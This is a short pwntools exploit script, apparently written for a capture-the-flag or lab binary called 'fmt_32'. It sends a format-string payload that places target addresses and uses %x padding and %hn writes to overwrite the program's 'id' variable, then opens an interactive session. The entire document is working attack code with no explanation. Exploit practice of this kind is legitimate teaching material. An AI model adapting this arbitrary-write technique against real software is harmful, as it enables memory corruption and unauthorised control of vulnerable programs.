#!/usr/bin/python3
from pwn import *
#context.log_level="debug"

io = process('./fmt_32')
elf = ELF('./fmt_32')
puts_got = elf.got['puts']
get_shell_addr = elf.symbols['get_shell']

id_addr = elf.symbols['id']

io.recvuntil(b"You can type exactly 256 charecters ...\n")
def change_addr():
    # addr
    payload = b""
    payload += p32(id_addr + 2) 
    payload += b"@@@@"
    payload += p32(id_addr) 
    payload += b"%8x%8x%8x%8x%8x"
    payload += b"%26196x%hn%4369x%hn"
    
    io.sendline(payload)

change_addr()
io.interactive()
io.close()
